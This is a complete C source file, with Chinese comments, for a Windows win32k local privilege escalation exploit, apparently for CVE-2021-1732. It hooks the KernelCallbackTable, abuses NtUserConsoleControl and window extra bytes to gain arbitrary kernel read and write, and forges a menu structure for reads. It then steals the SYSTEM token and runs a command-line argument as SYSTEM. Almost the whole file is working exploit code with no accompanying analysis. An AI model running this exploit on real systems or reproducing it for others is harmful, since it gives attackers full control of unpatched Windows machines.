#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

#define KERNEL_CALLBACK_TABLE_OFFSET 0x58
#define WND_EXTRA_DATA_PTR_OFFSET 0x128
#define WND_CBEXTRA_OFFSET 0xC8
#define WND_STYLE_OFFSET 0x18
#define WND_STYLE_WS_CHLD 0x4000000000000000
#define WND_MAPOFUSERSPACE_OFFSET 0x28

typedef PVOID(*xxxClientAllocWindowClassExtraBytes_t)(PDWORD Length);
typedef NTSTATUS(__fastcall* NtUserConsoleControl_t)(DWORD64, LPVOID, DWORD);
typedef NTSTATUS(__fastcall* NtCallbackReturn_t)(LPVOID, DWORD, NTSTATUS);
typedef PVOID(__fastcall* HMValidateHandle_t)(HANDLE, UINT);
typedef BOOL(*IsMenu_t)(HMENU hMenu);

typedef struct _HEAP_INFO {
	LPVOID BaseAddress;
	SIZE_T RegionSize;
}HEAP_INFO;

xxxClientAllocWindowClassExtraBytes_t xxxClientAllocWindowClassExtraBytes = 0;
NtUserConsoleControl_t NtUserConsoleControl = 0;
NtCallbackReturn_t NtCallbackReturn = 0;
HMValidateHandle_t HMValidateHandle = 0;
IsMenu_t u32_IsMenu = 0;

HMODULE g_hNtdll = 0;
HMODULE g_hWin32u = 0;
HMODULE g_hUser32 = 0;
WORD g_Randnum = 0;
HEAP_INFO g_HeapInfo = { 0 };
DWORD64 g_MinTagWnd = 0;
HWND g_hWndMax = 0;
DWORD g_pmbi_rcBar_left = 0;
DWORD64 g_WndMinDeskHeap = 0;
DWORD64	ref_g_rgItemList = 0;

VOID SetFuncHook(PDWORD64 newFunc) {
	//1.获取本进程的PEB
	DWORD64 ulCurrPEB = __readgsqword(0x60);
	printf("[+]Found ulCurrPEB = 0x%p\n", ulCurrPEB);
	//2.找到KernelCallbackTable
	PDWORD64 KernelCallbackTable = (PDWORD64)(ulCurrPEB + KERNEL_CALLBACK_TABLE_OFFSET);
	KernelCallbackTable = (PDWORD64)*KernelCallbackTable;
	printf("[+]Found KernelCallbackTable = 0x%p\n", KernelCallbackTable);
	PDWORD64  xxxClientAllocExtraBytesFunc = *(PDWORD64*)((DWORD64)KernelCallbackTable + 0x7B * 8);
	printf("[+]Found xxxClientAllocExtraBytesFunc = 0x%p\n", xxxClientAllocExtraBytesFunc);
	xxxClientAllocWindowClassExtraBytes = (xxxClientAllocWindowClassExtraBytes_t)xxxClientAllocExtraBytesFunc;
	//3.HOOK
	printf("[+]Hook Func = 0x%p\n", newFunc);
	//首先需要设置页面可写属性
	DWORD dwOldProtect;
	VirtualProtect((LPVOID)((DWORD64)KernelCallbackTable + 0x7B * 8), 0x300, PAGE_EXECUTE_READWRITE, &dwOldProtect);
	*(PDWORD64)((DWORD64)KernelCallbackTable + 0x7B * 8) = (DWORD64)newFunc;
	VirtualProtect((LPVOID)((DWORD64)KernelCallbackTable + 0x7B * 8), 0x300, dwOldProtect, &dwOldProtect);
}

DWORD64 readQword(DWORD64 DestAddress) {
	MENUBARINFO pmbi = { 0 };
	pmbi.cbSize = sizeof(MENUBARINFO);

	DWORD64* pTemp = (DWORD64*)LocalAlloc(0x40u, 0x200ui64);
	memset(pTemp, 0, 0x200);
	DWORD64 qwBase = 0x000000400000000;
	DWORD64 qwAdd = 0x0000000800000008;
	for (int i = 0; i < 0x40; i++)
	{
		*(pTemp + i) = qwBase + qwAdd * i;
	}
	*(DWORD64*)ref_g_rgItemList = (DWORD64)pTemp;

	GetMenuBarInfo(g_hWndMax, -3, 1, &pmbi);
	g_pmbi_rcBar_left = pmbi.rcBar.left;

	*(DWORD64*)ref_g_rgItemList = DestAddress - g_pmbi_rcBar_left;
	GetMenuBarInfo(g_hWndMax, -3, 1, &pmbi);
	return 	(unsigned int)pmbi.rcBar.left + ((__int64)pmbi.rcBar.top << 32);
}

HWND GetWndFromMap() {
	PVOID BaseAddr = g_HeapInfo.BaseAddress;
	DWORD64 visit = (DWORD64)BaseAddr;
	DWORD RegionSize = g_HeapInfo.RegionSize;
	HWND TargethWnd = 0;
	printf("[+]BaseAddr = 0x%p\n", BaseAddr);
	do {
		while (*(PWORD)visit != g_Randnum && RegionSize > 0) {
			visit += 2;
			RegionSize -= 1;
		}

		TargethWnd = (HWND) * (PDWORD)(visit - 0xc8);
	} while (!TargethWnd);

	return TargethWnd;
}

PVOID* WINAPI ClientAllocatWindowClassExtraBytesProxy(PDWORD size) {
	HWND hTargetWnd = 0;

	if (*size == g_Randnum) {
		//获取窗口句柄
		hTargetWnd = GetWndFromMap();
		printf("[+]hTargetWnd = 0x%p\n", hTargetWnd);
		//使用NtUserConsoleControl 将目标窗口的寻址模式修改为DesktopHeap+Offset
		NtUserConsoleControl(6, &hTargetWnd, 0x10);
		//修改hWndTriggle 的 tagWnd->ExtraBytes 为 hWndMin的桌面堆
		DWORD64 ulResult = g_WndMinDeskHeap;
		NtCallbackReturn(&ulResult, 24, 0);
	}
	return (PVOID*)xxxClientAllocWindowClassExtraBytes(size);
}

BOOLEAN Init() {
	BOOLEAN bRet = TRUE;
	int offset = 0;
	DWORD64 next_code = 0;

	__try {
		g_hUser32 = LoadLibraryA("user32");
		if (!g_hUser32) {
			printf("[!]Error: %d, Code = 0x%p", __LINE__, GetLastError());
			bRet = FALSE;
			__leave;
		}
		//获取u32_IsMenu
		u32_IsMenu = (IsMenu_t)GetProcAddress(g_hUser32, "IsMenu");
		if (!u32_IsMenu) {
			printf("[!]Error: %d, Code = 0x%p", __LINE__, GetLastError());
			bRet = FALSE;
			__leave;
		}

		for (int i = 0; i < 0x100; i++) {
			PUCHAR tr = (PUCHAR)u32_IsMenu + i;
			if (*tr == 0xE8)
			{//找到调用HMValidateHandle的指令位置
				offset = *(int*)((PCHAR)u32_IsMenu + i + 1);
				next_code = (DWORD64)u32_IsMenu + i + 5;
				HMValidateHandle = (HMValidateHandle_t)(next_code + offset);
				break;
			}
		}
		if (!HMValidateHandle) {
			printf("[!]Error: Can not find HMValidateHandle!\n");
			bRet = FALSE;
			__leave;
		}

		printf("[+]Found HMValidateHandle = 0x%p\n", HMValidateHandle);

		g_hNtdll = LoadLibraryA("ntdll");
		if (!g_hNtdll) {
			printf("[!]Error: %d, Code = 0x%p", __LINE__, GetLastError());
			bRet = FALSE;
			__leave;
		}

		g_hWin32u = LoadLibraryA("win32u");
		if (!g_hWin32u) {
			printf("[!]Error: %d, Code = 0x%p", __LINE__, GetLastError());
			bRet = FALSE;
			__leave;
		}

		NtCallbackReturn = (NtCallbackReturn_t)GetProcAddress(g_hNtdll, "NtCallbackReturn");
		if (!NtCallbackReturn) {
			printf("[!]Error: %d, Code = 0x%p", __LINE__, GetLastError());
			bRet = FALSE;
			__leave;
		}

		NtUserConsoleControl = (NtUserConsoleControl_t)GetProcAddress(g_hWin32u, "NtUserConsoleControl");
		if (!NtUserConsoleControl) {
			printf("[!]Error: %d, Code = 0x%p", __LINE__, GetLastError());
			bRet = FALSE;
			__leave;
		}

	}
	__finally {

	}
	return bRet;
}

LRESULT __fastcall WindowProc(HWND a1, UINT a2, WPARAM a3, LPARAM a4)
{
	if (a2 != 2)
		return DefWindowProcW(a1, a2, a3, a4);
	PostQuitMessage(0);
	return 0;
}

int main(int argc, char** argv)
{
	WNDCLASSEXW WndClassExW = { 0 };
	HWND hWndTriggerBug = 0;
	HWND HandleList[10] = { 0 };
	LPVOID HandleMap[10] = { 0 };
	MEMORY_BASIC_INFORMATION Buffer = { 0 };

	if (!Init()) {
		return 0;
	}

	SetFuncHook((PDWORD64)ClientAllocatWindowClassExtraBytesProxy);
	srand(time(0));
	g_Randnum = rand() % 255 + 0xabcd;

	WndClassExW.hIcon = 0;
	WndClassExW.hbrBackground = 0;
	WndClassExW.lpszClassName = 0;
	WndClassExW.lpfnWndProc = (WNDPROC)WindowProc;
	WndClassExW.cbSize = 80;
	WndClassExW.style = 3;
	WndClassExW.cbClsExtra = 0;
	WndClassExW.cbWndExtra = 0x20;
	WndClassExW.hInstance = GetModuleHandleW(0);
	WndClassExW.lpszClassName = L"DemoClass";
	//atom1窗口进行漏洞利用
	ATOM atom1 = RegisterClassExW(&WndClassExW);

	WndClassExW.cbWndExtra = g_Randnum;
	WndClassExW.lpszClassName = L"TriggerClass";

	//atom2窗口用来触发漏洞
	ATOM atom2 = RegisterClassExW(&WndClassExW);

	for (int i = 0; i < 10; i++) {
		HandleList[i] = CreateWindowExW(
			0x8000000u,
			(LPCWSTR)(unsigned __int16)atom1,
			L"LeakSomething",
			0x8000000u,
			0,
			0,
			0,
			0,
			0,
			CreateMenu(),
			GetModuleHandleW(0),
			0);
		if (!HandleList[i]) {
			printf("[!]Error: %d, Code = 0x%p", __LINE__, GetLastError());
			exit(1);
		}
		DWORD64 KernelMap = (DWORD64)HMValidateHandle(HandleList[i], 1);//获取tagWNDk在用户空间中的可读映射地址
		HandleMap[i] = (PVOID)KernelMap;
		VirtualQuery((PVOID)KernelMap, &Buffer, 0x30);
		if (g_HeapInfo.BaseAddress == NULL || (DWORD64)g_HeapInfo.BaseAddress >= (DWORD64)Buffer.BaseAddress) {
			g_HeapInfo.BaseAddress = (PVOID)Buffer.BaseAddress;
			g_HeapInfo.RegionSize = (DWORD64)Buffer.RegionSize;
		}
	}
	//释放掉8个窗口，剩下两个备用，记为Wnd_1和Wnd_2 
	for (int i = 2; i < 10; i++) {
		DestroyWindow(HandleList[i]);
	}

	DWORD64 Wnd1_DeskHeap = *(PDWORD64)((PCHAR)HandleMap[0] + 8);
	DWORD64 Wnd2_DeskHeap = *(PDWORD64)((PCHAR)HandleMap[1] + 8);
	//找到桌面堆地址最小的那个窗口
	HWND hWndMin = HandleList[(Wnd1_DeskHeap < Wnd2_DeskHeap ? 0 : 1)];
	//找到桌面堆地址最大的那个窗口
	g_hWndMax = HandleList[(Wnd1_DeskHeap > Wnd2_DeskHeap ? 0 : 1)];

	//找到桌面堆地址最小的tagWnd
	g_MinTagWnd = (DWORD64)HandleMap[(Wnd1_DeskHeap < Wnd2_DeskHeap ? 0 : 1)];
	//记录桌面堆最大的tagWnd
	DWORD64 MaxTagWnd = (DWORD64)HandleMap[(Wnd1_DeskHeap > Wnd2_DeskHeap ? 0 : 1)];

	//设置hWndMin的寻址方式为DeskHeap+offset
	NtUserConsoleControl(6, &hWndMin, 0x10);

	//保存原先的tagWnd->ExtraBytes
	DWORD64 ulOldMaxExtraBytes = *(PDWORD64)(MaxTagWnd + WND_EXTRA_DATA_PTR_OFFSET);
	DWORD64 ulOldMinExtraBytes = *(PDWORD64)(g_MinTagWnd + WND_EXTRA_DATA_PTR_OFFSET);

	g_WndMinDeskHeap = *(PDWORD)(g_MinTagWnd + 8);
	DWORD64 WndMaxDeskHeap = *(PDWORD)(MaxTagWnd + 8);
	//创建一个触发漏洞的窗口
	hWndTriggerBug = CreateWindowExW(
		0x8000000u,
		(LPCWSTR)(unsigned __int16)atom2,
		L"LeakSomething",
		0x8000000u,
		0,
		0,
		0,
		0,
		0,
		CreateMenu(),
		GetModuleHandleW(0),
		0);
	printf("[+]Created windows = 0x%p\n", hWndTriggerBug);
	/*
	此时触发漏洞的窗口已经在我们Hook的函数中被修改了寻址模式
	*/

	//在hWndMin的tagWnd->ExtraBytes设置为hWndMin的桌面堆
	SetWindowLongW(hWndTriggerBug, WND_EXTRA_DATA_PTR_OFFSET, g_WndMinDeskHeap);
	//将WndWin的Extra_Size修改为0xffffffff，从而解除对WndWin使用SetWindowLong* 系列函数的限制
	SetWindowLongW(hWndTriggerBug, WND_CBEXTRA_OFFSET, 0xffffffff);
	/*
		现在已经获得写原语，通过hWndMin和hWndMax的组合即实现可任意内核地址写
		接下来要实现读原语，需要利用到tagMenu，所以对MenuBarInfo结构体进行伪造
	*/
	DWORD64	tagMenu = (__int64)LocalAlloc(0x40u, 0x200ui64);
	printf("[+]tagMenu = 0x%p\n", tagMenu);
	DWORD64	idItemInfo = (__int64)LocalAlloc(0x40u, 0x30ui64);
	printf("[+]idItemInfo = 0x%p\n", idItemInfo);
	DWORD64	spSelf = (__int64)LocalAlloc(0x40u, 8ui64);
	printf("[+]spSelf = 0x%p\n", spSelf);
	DWORD64	spMenu = (LONG_PTR)LocalAlloc(0x40u, 0xA0ui64);
	printf("[+]spMenu = 0x%p\n", spMenu);
	HLOCAL	rgItemList = LocalAlloc(0x40u, 40ui64);
	printf("[+]rgItemList = 0x%p\n", rgItemList);

	DWORD64 ref_tagMenu = tagMenu;
	DWORD64 ref_idItemInfo = idItemInfo;
	DWORD64 ref_spSelf = spSelf;
	DWORD64	ref_spMenu = spMenu;
	ref_g_rgItemList = (DWORD64)rgItemList;

	*(DWORD*)(idItemInfo + 0x2c) = 0x10;
	*(PDWORD)ref_tagMenu = 0x66666666;
	*(DWORD64*)(ref_tagMenu + 0x28) = ref_idItemInfo;
	*(PDWORD)(ref_tagMenu + 0x40) = 1;
	*(PDWORD)(ref_tagMenu + 0x44) = 1;
	*(DWORD64*)(ref_tagMenu + 0x58) = (DWORD64)rgItemList;
	*(DWORD64*)ref_spSelf = tagMenu;
	*(DWORD64*)(ref_spMenu + 0x98) = ref_spSelf;

	//替换hWndMmax的spMenu
	DWORD64 ulOffset = WndMaxDeskHeap - g_WndMinDeskHeap;

	DWORD64 MaxWndStyle = *(PDWORD64)(MaxTagWnd + WND_STYLE_OFFSET);
	//__debugbreak();
	//设置hWinMax的窗口样式包含WS_CHLD
	SetWindowLongPtrA(hWndMin, ulOffset + WND_STYLE_OFFSET, MaxWndStyle ^ WND_STYLE_WS_CHLD);
	//修改hWndMax的spMenu为我们伪造的spMenu
	DWORD64 ulOldtagMenu = SetWindowLongPtrA(g_hWndMax, GWLP_ID, spMenu);
	printf("[+]ulOldtagMenu = 0x%p\n", ulOldtagMenu);
	//恢复hWinMax的窗口样式
	SetWindowLongPtrA(hWndMin, ulOffset + WND_STYLE_OFFSET, MaxWndStyle);
	//此时已经获得读原语，并封装成函数readQWORD()
	DWORD64 first = readQword(ulOldtagMenu + 0x50);
	printf("[+]first = 0x%p\n", first);

	DWORD64 second = readQword(first + 0x18);
	printf("[+]second = 0x%p\n", second);

	DWORD64 third = readQword(second + 0x80);
	printf("[+]third = 0x%p\n", third);

	DWORD64 pTagThreadInfo = readQword(first + 0x10);
	printf("[+]pTagThreadInfo = 0x%p\n", pTagThreadInfo);

	DWORD64 tagThreadInfo = readQword(pTagThreadInfo);
	printf("[+]tagThreadInfo = 0x%p\n", tagThreadInfo);

	DWORD64 _Eprocess = readQword(tagThreadInfo + 0x220);
	printf("[+]_Eprocess = 0x%p\n", _Eprocess);

	DWORD64 CurEprocess = _Eprocess;
	DWORD CurPid = GetCurrentProcessId();
	DWORD64 SystemToken = 0;
	DWORD64 CurTokenAddr = 0;
	DWORD64 tagWndTriggle = 0;

	do {
		DWORD pid = readQword(_Eprocess + 0x2E8);
		if (pid == 4) {
			SystemToken = readQword(_Eprocess + 0x360);
			printf("[+]SystemToken = 0x%p\n", SystemToken);
		}
		else if (pid == CurPid) {
			CurTokenAddr = _Eprocess + 0x360;
			printf("[+]CurTokenAddr = 0x%p\n", CurTokenAddr);
		}

		_Eprocess = readQword(_Eprocess + 0x2F0) - 0x2F0;
	} while (_Eprocess != CurEprocess);

	if (!SystemToken || !CurTokenAddr) {
		printf("[!]Error:%d", __LINE__);
	}
	else {
		//替换Token
		SetWindowLongPtrA(hWndMin, ulOffset + WND_EXTRA_DATA_PTR_OFFSET, CurTokenAddr);
		SetWindowLongPtrA(g_hWndMax, 0, SystemToken);
		//验证是否提权成功
		printf("[+]Try to execute %s as SYSTEM!\n", argv[1]);
		system(argv[1]);
	}

	printf("[+]恢复原来的配置...\n");

	//恢复到没有修改之前的状态，防止蓝屏
	tagWndTriggle = (DWORD64)HMValidateHandle(hWndTriggerBug, 1);
	//tagWnd->Flags
	DWORD64 Flags = *(PDWORD64)(tagWndTriggle + 0xE0) ^ 0x80000000000;
	//g_hWndMax tagWnd->ExtraBytes=0
	SetWindowLongPtrA(hWndMin, ulOffset + WND_EXTRA_DATA_PTR_OFFSET,
		third + *(PDWORD)(tagWndTriggle + 8) + WND_EXTRA_DATA_PTR_OFFSET);
	SetWindowLongPtrA(g_hWndMax, 0, 0);
	//去除tagWndTriggle tagWnd->Flags中的0x800标记
	SetWindowLongPtrA(hWndMin, ulOffset + WND_EXTRA_DATA_PTR_OFFSET,
		third + *(PDWORD)(tagWndTriggle + 8) + 0xE0);
	SetWindowLongPtrA(g_hWndMax, 0, Flags);
	//还原tagWnd->spMenu
	SetWindowLongPtrA(hWndMin, ulOffset + WND_STYLE_OFFSET, MaxWndStyle ^ WND_STYLE_WS_CHLD);
	SetWindowLongPtrA(g_hWndMax, GWLP_ID, ulOldtagMenu);
	SetWindowLongPtrA(hWndMin, ulOffset + WND_STYLE_OFFSET, MaxWndStyle);
	//还原 hWndMin tagWnd->ExtraBytes 
	SetWindowLongPtrA(hWndMin, WND_EXTRA_DATA_PTR_OFFSET + ulOffset, ulOldMaxExtraBytes);
	SetWindowLongPtrA(hWndMin, WND_EXTRA_DATA_PTR_OFFSET, ulOldMinExtraBytes);
	return 0;
}
